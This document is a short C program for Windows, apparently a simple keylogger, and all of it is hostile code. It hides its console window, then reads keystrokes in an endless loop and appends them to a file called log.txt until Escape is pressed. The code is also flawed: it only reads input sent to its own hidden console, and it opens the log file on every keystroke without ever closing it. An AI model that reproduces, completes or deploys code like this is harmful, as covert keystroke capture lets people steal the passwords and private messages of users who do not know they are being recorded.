#include <stdio.h>                             //standard input output
#include <conio.h>                             //for kbhit and getch

#define _WIN32_WINNT 0x0500                    //specifing windows version
#include <windows.h>                           //for console control

#define FILENAME "log.txt"                     //destination file

void logToFile(char *key)                      //function receives pointer to char
{
    FILE *f = fopen(FILENAME, "a");            //defines and opens stream

    switch(*key)                               //decides what to make with received char
    {
        case 13: fprintf(f, "\n"); break;      //Breaks line on ENTER
        default: fprintf(f, "%c", *key);       //writes to file on deafult
    }
}

int main()                                     //start point
{
    char key = 0;                              //char to be read

    HWND console = GetConsoleWindow();         //gets console handle
    ShowWindow(console, SW_HIDE);              //hides console

    while(1)                                   //infinite loop
    {
        if(kbhit())                            //on key press
        {
            key = getch();                     //gets key
            if(key == 27) break;
            logToFile(&key);                   //calls function sending char's address
        }
    }
    return 0;                                  //exits
}
